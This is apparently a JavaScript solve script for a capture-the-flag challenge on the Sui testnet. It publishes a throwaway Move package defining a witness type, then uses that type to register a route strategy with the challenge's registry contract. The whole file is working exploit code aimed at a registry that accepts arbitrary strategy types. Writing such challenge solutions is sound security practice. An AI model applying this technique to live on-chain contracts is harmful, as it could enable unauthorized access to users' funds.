import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import { SuiJsonRpcClient } from "@mysten/sui/jsonRpc";
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiJsonRpcClient({ url: process.env.RPC_URL });
const keypair = Ed25519Keypair.fromSecretKey(process.env.PRIVKEY);
const pkg = process.env.PACKAGE_ID;
const usdc = `${pkg}::assets::USDC`;
const suix = `${pkg}::assets::SUIX`;

function writeExploitPackage() {
  const dir = mkdtempSync(join(tmpdir(), "compfest-route-strategy-"));
  mkdirSync(join(dir, "sources"));
  writeFileSync(
    join(dir, "Move.toml"),
    `[package]\nname = "compfest_strategy"\nversion = "0.1.0"\nedition = "2024"\n\n[addresses]\ncompfest_strategy = "0x0"\n`,
  );
  writeFileSync(
    join(dir, "sources", "strategy.move"),
    `module compfest_strategy::strategy;\n\npublic struct LatencyArb has drop {}\n\npublic fun witness(): LatencyArb {\n    LatencyArb {}\n}\n`,
  );
  return dir;
}

function publishStrategy() {
  const dir = writeExploitPackage();
  const clientConfig = join(dir, "client.yaml");
  const keystore = join(dir, "sui.keystore");
  writeFileSync(keystore, "[]\n");
  writeFileSync(
    clientConfig,
    `---\nkeystore:\n  File: ${keystore}\nenvs:\n  - alias: testnet\n    rpc: "https://fullnode.testnet.sui.io:443"\n    ws: ~\n    basic_auth: ~\n    chain_id: 4c78adac\nactive_env: testnet\nactive_address: ~\n`,
  );
  const result = spawnSync(
    "sui",
    ["move", "--client.config", clientConfig, "--client.env", "testnet", "build", "--path", dir, "--default-move-flavor", "sui", "-e", "testnet", "--dump-bytecode-as-base64", "--no-tree-shaking"],
    { encoding: "utf8", env: { ...process.env } },
  );
  if (result.status !== 0) throw new Error(`build failed: ${result.stderr}`);
  const jsonLine = result.stdout.trim().split("\n").at(-1);
  rmSync(dir, { recursive: true, force: true });
  return JSON.parse(jsonLine);
}

async function execute(tx, label) {
  tx.setGasBudget(100_000_000);
  try {
    const r = await client.signAndExecuteTransaction({
      signer: keypair,
      transaction: tx,
      options: { showEffects: true, showObjectChanges: true, showEvents: true },
    });
    console.log(label, "STATUS:", JSON.stringify(r.effects?.status));
    return r;
  } catch (err) {
    console.log(label, "THREW:", err?.constructor?.name);
    console.log(label, "MESSAGE:", err?.message);
    console.log(label, "FULL:", JSON.stringify(err, Object.getOwnPropertyNames(err), 2));
    throw err;
  }
}

const compiled = publishStrategy();
const tx1 = new Transaction();
const upgradeCap = tx1.publish({ modules: compiled.modules, dependencies: compiled.dependencies });
tx1.transferObjects([upgradeCap], tx1.pure.address(keypair.toSuiAddress()));
const pub = await execute(tx1, "publish");
let strategyPkg;
for (const c of pub.objectChanges ?? []) {
  if (c.type === "published") strategyPkg = c.packageId;
}
console.log("strategy_package:", strategyPkg);
const strategyType = `${strategyPkg}::strategy::LatencyArb`;

const tx2 = new Transaction();
const witness = tx2.moveCall({ target: `${strategyPkg}::strategy::witness` });
tx2.moveCall({
  target: `${pkg}::challenge::register_route_strategy`,
  typeArguments: [usdc, suix, strategyType],
  arguments: [tx2.object(process.env.REGISTRY), witness],
});
await execute(tx2, "register");
console.log("DONE");
